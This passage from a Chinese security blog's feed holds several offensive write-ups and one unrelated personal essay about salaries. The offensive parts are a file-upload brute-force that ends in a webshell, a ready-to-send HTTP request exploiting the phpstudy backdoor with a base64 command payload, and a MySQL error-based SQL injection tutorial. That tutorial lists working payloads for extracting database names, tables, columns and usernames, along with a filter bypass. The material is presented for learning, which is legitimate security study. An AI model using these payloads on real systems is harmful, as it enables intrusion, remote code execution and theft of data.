alt="20191127记一次任意文件上传"><br>经过长时间的测试，uploadUserNo参数中加上//会导致报错，可以看到文件真实路径(getshell后发现uploadUserNo参数的值会和文件名进行拼接，例如：uploadUserNo参数值为dd//时，文件名为：dd//_年月日时分秒四位随机数_上传文件名，因为文件名不允许有//等特殊字符，所以会报错)。<br>此时知道文件目录为TempFile，文件名随机重命名，能够看到其命名规则为【_年月日时分秒四位随机数_上传文件名】<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png" alt="20191127记一次任意文件上传"><br>与电脑时间同步上传，可能秒数会有偏差，假设为偏差间隔为3秒，加上四位随机数字。<br>重新上传一次文件，记录上传时间为：“2019年11月27日16时19分11秒”。然后构造数据包进行爆破。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/4.png" alt="20191127记一次任意文件上传"><br>设置第一个标志位<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/5.png" alt="20191127记一次任意文件上传"><br>设置第二个标志位加载生成的0000-9999的4位数字典<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/6.png" alt="20191127记一次任意文件上传"><br>经过一段时间后爆破成功。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/7.png" alt="20191127记一次任意文件上传"><br>访问会报错，但问题不大，拿shell客户端直接连接<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/8.png" alt="20191127记一次任意文件上传"><br>Getshell成功<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/9.png" alt="20191127记一次任意文件上传"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;很久没发文章了，一个是因为忙，另一个就是不知道发什么，这次遇到一个上传觉得挺有意思的，就分享一下思路。&lt;br&gt;在客户现场驻场遇到的站点，我们乙方在挖洞的同时，甲方也有十多个人在同步挖洞。我们少挖到洞还要找我们麻烦，欲哭无泪，太难了。&lt;br&gt;当时通过另外一个漏洞getshell，还在暗自高兴的时候，翻目录的时候，看到一个TempFile的目录下有个名为shell.aspx的文件，文件上传时间在目标给我们的前几个小时（客户在给我们目标前，就让甲方的渗透人员先测试了），此时的我笑容逐渐消失，意识到问题的严重性。&lt;/p&gt;</summary>
    
    
    
    <category term="原创文章" scheme="http://www.secice.cn/categories/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/"/>
    
    
    <category term="渗透实战" scheme="http://www.secice.cn/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    
    <category term="原创文章" scheme="http://www.secice.cn/tags/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title>phpstudy后门利用方法及getshell</title>
    <link href="http://www.secice.cn/p/c3ec4232"/>
    <id>http://www.secice.cn/p/c3ec4232</id>
    <published>2019-09-24T10:15:12.000Z</published>
    <updated>2020-12-13T11:14:28.439Z</updated>
    
    <content type="html"><![CDATA[<p>请求任意后缀为php的文件</p><p>目标环境为php5.2,5.4,且不能为nts</p><p>存在Accept-Encoding: gzip,deflate</p><p>此处填写base64加密后的payload：accept-charset: c3lzdGVtKCdjYWxjLmV4ZScpOw</p><p>PayLoad:</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/phpinfo.php</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 192.168.1.1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27<span class="hljs-attribute">Sec-Fetch-Mode</span>: navigate<span class="hljs-attribute">Sec-Fetch-User</span>: ?1<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3<span class="hljs-attribute">Sec-Fetch-Site</span>: none,<span class="hljs-attribute">accept-charset</span>: c3lzdGVtKCdjYWxjLmV4ZScpOw<span class="hljs-attribute">Accept-Encoding</span>: gzip,deflate<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9</code></pre><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20190924_phpstudy%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%8F%8Agetshell/01.jpg" alt="phpstudy后门利用方法及getshell"></p><p>其他更好玩的思路靠自己去思考</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;请求任意后缀为php的文件&lt;/p&gt;
&lt;p&gt;目标环境为php5.2,5.4,且不能为nts&lt;/p&gt;
&lt;p&gt;存在Accept-Encoding: gzip,deflate&lt;/p&gt;
&lt;p&gt;此处填写base64加密后的payload：accept-charset: c3lzdGVt</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://www.secice.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://www.secice.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="phpstudy" scheme="http://www.secice.cn/tags/phpstudy/"/>
    
  </entry>
  
  <entry>
    <title>莫名的感慨</title>
    <link href="http://www.secice.cn/p/7c8c6805"/>
    <id>http://www.secice.cn/p/7c8c6805</id>
    <published>2019-09-20T03:00:36.000Z</published>
    <updated>2020-11-23T09:04:27.119Z</updated>
    
    <content type="html"><![CDATA[<p>在学生时代感觉月薪一万好高，总觉得有1万元可以干很多事情，可以去旅游，可以买电脑啊，可以买零食等等</p><p>等工作，到手工资又一万了，反而感觉不高了。</p><p>这是一个正常的现象，这是很多大学生进入社会最深切的感受。</p><p>因为的你的生活水平变了，消费水平变高了，自然而然的对收入的要求也变高了。</p><p>俗话说的好，由俭入奢易，由奢入俭难。</p><a id="more"></a><p><strong>一.学生时代的你</strong></p><p>以前上学生活费都是家里给的，根本不会有经济压力，没钱了，就能够朝父母要。</p><p>况且给到手的钱都是实实在在的零花钱。</p><p>千把块一共就这么点还能花很长时间，所以毕业前感觉月薪一万很高。</p><p>学生时代的时候住的是宿舍，吃的是食堂，没有其他的大花销。在上学的时候交学费有父母，也体会不到赚钱的辛苦。</p><p>一般学校的宿舍住宿费都是一年一交，差不多都是1200左右一年，算下来只要100块钱一个月，更何况住宿费还是包含在学费里面，根本不用另外交。</p><p>学校的食堂吃饭荤菜3块-4块左右一个，蔬菜1块钱一个，一餐只要8块钱左右就已经能够满足日常基本需求，</p><p>一天基本算下来是早餐4元+中餐8元+晚餐8元，总共加起来20元就能活一天。</p><p>特别是在学生时代买新衣服和鞋子父母还会另外给钱。一个月除了吃饭日常花销600元，剩下的钱就能够出去改善伙食或者玩。</p><p>这种时候要是给你一万块钱，那肯定是很高，想买啥就买啥，想吃啥就吃啥，你当然会觉得月薪一万块好高。</p><p><strong>二.毕业以后的你</strong></p><p>1.固定开支大</p><p>每个月都会有固定的开支，房租，水电费，一日三餐，交通费，这些几乎都是固定开支。</p><p>这些钱都是要靠你自己的工资去支付。在社会上已经没有学校那么廉价的宿舍了，在外租房每个月都需要支出1500元以上，已经抵得上在学生时代一个月的生活费。</p><p>还有出社会以后也没有了那么便宜的食堂，一日三餐，最少花费早餐5元+午餐外卖15元+晚餐15元，一个月光吃饭最省都要1050元。</p><p>还有每日上班的交通费最少10元。一个月下来就最日常的食住行就要花费3000元左右。</p><p>2.社交开支少不了</p><p>工作后还少不了社交活动，比如说：与同事出去聚餐，基本开支的最少也要200元左右吧，</p><p>就算去路边的夜排挡开支也要100多以上，如果还有娱乐节目，去唱歌KTV，喝喝酒买几瓶饮料也是不少的费用.</p><p>当然了，邀请女生去看电影，吃饭、买饮料零食，送来回路程，这些费用也是需要花费的.</p><p>3.日常生活水平也提高</p><p>工作以后日常生活水平肯定也是提高的。逛街买衣服，衣服也越来越注重品牌，以前你可能一身衣服几百块，现在一身动不动就上千块。</p><p>4.人情世故少不了</p><p>在社会上，还少不了人情世故。学生的时候因为还没赚钱，朋友圈也没有到婚丧嫁娶的年纪，也没人会计较你给没给礼钱。</p><p>但是工作了就不一样了，朋友圈里面结婚、生孩子的也不少了。你就得各种凑份子钱，这也是一大笔的开销。</p><p>网友也在网络上各种调侃，过个五一、过个十一就得花费一个月甚至2个月的工资在礼金上，都快活不下去，要吃土了。</p><p>这样一对比下来一万块钱的工资还不如在学生时代的1000块钱经花。</p><p>因为生活质量提高了，钱花的也就快了，所以你感觉一万块几乎不够你用的了，就会觉得一万的工资也不高。</p><p>因此要想能够省下来钱，一种是降低你生活水平，减少日常花销。另外一种是提升自己的综合实力赚更多的钱。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在学生时代感觉月薪一万好高，总觉得有1万元可以干很多事情，可以去旅游，可以买电脑啊，可以买零食等等&lt;/p&gt;
&lt;p&gt;等工作，到手工资又一万了，反而感觉不高了。&lt;/p&gt;
&lt;p&gt;这是一个正常的现象，这是很多大学生进入社会最深切的感受。&lt;/p&gt;
&lt;p&gt;因为的你的生活水平变了，消费水平变高了，自然而然的对收入的要求也变高了。&lt;/p&gt;
&lt;p&gt;俗话说的好，由俭入奢易，由奢入俭难。&lt;/p&gt;</summary>
    
    
    
    <category term="胡思乱想" scheme="http://www.secice.cn/categories/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/"/>
    
    
    <category term="生活" scheme="http://www.secice.cn/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入学习之MYSQL报错注入</title>
    <link href="http://www.secice.cn/p/7a3f5d50"/>
    <id>http://www.secice.cn/p/7a3f5d50</id>
    <published>2019-08-14T06:02:34.000Z</published>
    <updated>2020-12-14T05:55:21.959Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h2><p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。</p><h2 id="MYSQL报错注入分类："><a href="#MYSQL报错注入分类：" class="headerlink" title="MYSQL报错注入分类："></a>MYSQL报错注入分类：</h2><blockquote><p>BIGINT等数据类型溢出</p></blockquote><blockquote><p>xpath语法错误</p></blockquote><blockquote><p>concat+rand()+group_by()导致主键重复</p></blockquote><blockquote><p>一些特性</p></blockquote><p>下面就针对这几种错误类型看看背后的原理是怎样的。</p><h2 id="BIGINT等数据类型溢出"><a href="#BIGINT等数据类型溢出" class="headerlink" title="BIGINT等数据类型溢出"></a>BIGINT等数据类型溢出</h2><p>按位取反<code>~</code>、<code>!</code>、<code>exp()</code>来溢出报错。</p><p>有版本限制，<code>mysql&gt;5.5.53</code>时，则不能返回查询结果。</p><pre><code class="hljs mysql">select exp(~(select*from(select user())x));</code></pre><pre><code class="hljs mysql">select (select(!x-~0)from(select(select user())x)a);</code></pre><p>报错信息是有长度限制的，在<code>mysql/my_error.c</code>中可以看到</p><h2 id="xpath报错"><a href="#xpath报错" class="headerlink" title="xpath报错"></a>xpath报错</h2><p>通过xml函数进行报错，来进行注入。主要涉及2个函数:</p><blockquote><p>1、updatexml()</p></blockquote><blockquote><p>2、extractvalue()</p></blockquote><p>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里。这就是xpath报错注入的原理</p><h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><p><code>updatexml((XML_document, XPath_string, new_value):</code></p><blockquote><p>第一个参数：xml文档的名称</p><p>第二个参数：xpath格式的字符串</p><p>第三个参数：替换查找到的符合条件的数据</p></blockquote><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>必须是在xpath那里传特殊字符，mysql才会报错，而我们又要注出数据，没这么多位置，所以要用到concat函数</li><li>xpath只会对特殊字符进行报错，这里我们可以用~，16进制的0x7e来进行利用</li><li>xpath只会报错32个字符，所以要用到substr</li></ul><h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><ul><li>爆数据库版本</li></ul><pre><code class="hljs mysql">updatexml(1,concat(0x7e,version(),0x7e),1)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/01.png" alt="img"></p><ul><li>爆所有数据库</li></ul><pre><code class="hljs mysql">updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),1,32) from information_schema.schemata)),0x7e)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/02.png" alt="img"></p><p>但是报错长度有限制，可以使用<code>limit</code>来偏移</p><pre><code class="hljs mysql">updatexml(1,concat(0x7e,(select substr(schema_name,1,32) from information_schema.schemata limit 4,1)),0x7e)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/03.png" alt="img"></p><ul><li>爆所有表</li></ul><pre><code class="hljs mysql">updatexml(1,concat(0x7e,(select substr(group_concat(table_name),1,32) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/04.png" alt="img"></p><ul><li>爆所有列</li></ul><pre><code class="hljs mysql">updatexml(1,concat(0x7e,(select substr(group_concat(column_name),1,32) from information_schema.columns where table_schema&#x3D;database()),0x7e),1)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/05.png" alt="img"></p><ul><li>爆数据</li></ul><pre><code class="hljs mysql">updatexml(1,concat(0x7e,(select substr(group_concat(username),1,32) from users),0x7e),1)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/06.png" alt="img"></p><h3 id="Extractvalue报错注入"><a href="#Extractvalue报错注入" class="headerlink" title="Extractvalue报错注入"></a>Extractvalue报错注入</h3><p><code>extractvalue(xml_str , Xpath)</code><br>第一个参数意思是传入xml文档，第二个参数xpath意思是传入文档的路径</p><p>还是对第二个参数xpath传入特殊字符，让它报错，跟updatexml的payload差不多，只不过一个是3个参数，一个是两个，这里就不详细列出来了</p><pre><code class="hljs mysql">extractvalue(1,concat(0x7e,version(),1))</code></pre><h2 id="主键重复"><a href="#主键重复" class="headerlink" title="主键重复"></a>主键重复</h2><pre><code class="hljs mysql">mysql&gt; select count(*) from user group by concat(version(),floor(rand(0)*2));ERROR 1062 (23000): Duplicate entry &#39;5.1.60-community-log1&#39; for key &#39;group_key&#39;</code></pre><pre><code class="hljs mysql">mysql&gt; select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2));ERROR 1062 (23000): Duplicate entry &#39;root@localhost1&#39; for key &#39;group_key&#39;</code></pre><p>只要是<code>count</code>，<code>rand()</code>，<code>group by</code>三个连用就会造成这种报错，与位置无关。</p><h2 id="函数特性报错"><a href="#函数特性报错" class="headerlink" title="函数特性报错"></a>函数特性报错</h2><p><code>在版本号为5.5.47上可以用来注入，而在5.7.17上则不行</code></p><ul><li>geometrycollection()</li></ul><pre><code class="hljs mysql">and geometrycollection((select * from(select * from(select user())a)b))-- +</code></pre><ul><li>multipoint()</li></ul><pre><code class="hljs mysql">and multipoint((select * from(select * from(select user())a)b))-- +</code></pre><ul><li>polygon()</li></ul><pre><code class="hljs mysql">and polygon((select * from(select * from(select user())a)b))-- +</code></pre><ul><li>multipolygon()</li></ul><pre><code class="hljs mysql">and multipolygon((select * from(select * from(select user())a)b))-- +</code></pre><ul><li>linestring()</li></ul><pre><code class="hljs mysql">and linestring((select * from(select * from(select user())a)b))-- +</code></pre><ul><li>multilinestring()</li></ul><pre><code class="hljs mysql">and multilinestring((select * from(select * from(select user())a)b))-- +</code></pre><h2 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h2><h3 id="过滤information-schema"><a href="#过滤information-schema" class="headerlink" title="过滤information_schema"></a>过滤information_schema</h3><p>如果程序过滤information_schema，无法获取表名，利用polygon()进行绕过，括号里填上存在的列名(一般都有id这个列)，即可爆出表名</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/07.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;概念：&quot;&gt;&lt;a href=&quot;#概念：&quot; class=&quot;headerlink&quot; title=&quot;概念：&quot;&gt;&lt;/a&gt;概念：&lt;/h2&gt;&lt;p&gt;SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息</summary>
      
    
    
    
    <category term="SQL注入" scheme="http://www.secice.cn/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="SQL注入" scheme="http://www.secice.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="报错注入" scheme="http://www.secice.cn/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
